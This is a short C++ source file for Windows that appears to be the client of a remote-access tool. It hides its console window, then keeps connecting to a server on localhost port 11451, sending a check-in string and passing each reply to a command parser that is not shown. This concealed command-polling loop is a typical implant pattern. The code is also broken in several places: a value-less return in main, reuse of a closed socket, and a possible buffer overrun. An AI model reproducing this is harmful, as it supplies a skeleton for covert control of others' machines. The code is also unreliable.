#include <windows.h>
#include <winsock2.h>
#include "common/log/localLog.h"
#include "common/status/localStatus.h"
#include "common/staticValues/localStaticValues.h"
#include "service/parseCommands.h"

#pragma comment(lib, "ws2_32.lib")

using namespace std;

int main (int argc, const char *argv[]) {
    // Hide the window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Init values
    u_int sleepTime = 5;
    u_int clientID = 0;


    // Init WSA
    WORD socketVersion = MAKEWORD(2, 2);
    WSADATA wsaData;
    if (WSAStartup(socketVersion, &wsaData) != 0){
        return INIT_SOCKET_ERROR;
    } else {
        logMessage("Finish Init WSA.");
    }

    // Create socket
    SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sclient == INVALID_SOCKET)
    {
        printf("invalid socket!");
        return 0;
    }

    sockaddr_in serAddr;
    serAddr.sin_family = AF_INET;
    serAddr.sin_port = htons(11451);
    serAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");


    while (true) {
        if(connect(sclient, (sockaddr *)&serAddr, sizeof(serAddr)) == SOCKET_ERROR) {  //连接失败
            printf("connect error !");
            closesocket(sclient);
            return ;
        }
        char *sendData = "qut";
        send(sclient, sendData, strlen(sendData), 0);

        char recData[MAX_SOCKET_DATA_LENGTH];
        int ret = recv(sclient, recData, MAX_SOCKET_DATA_LENGTH, 0);
        if(ret>0){
            recData[ret] = 0x00;
            if (parseCommand(recData)) {
                cout << recData << endl;
            } else {
                break;
            }
        }

        closesocket(sclient);
        Sleep(sleepTime);
    }

    WSACleanup();

    return 0;

}
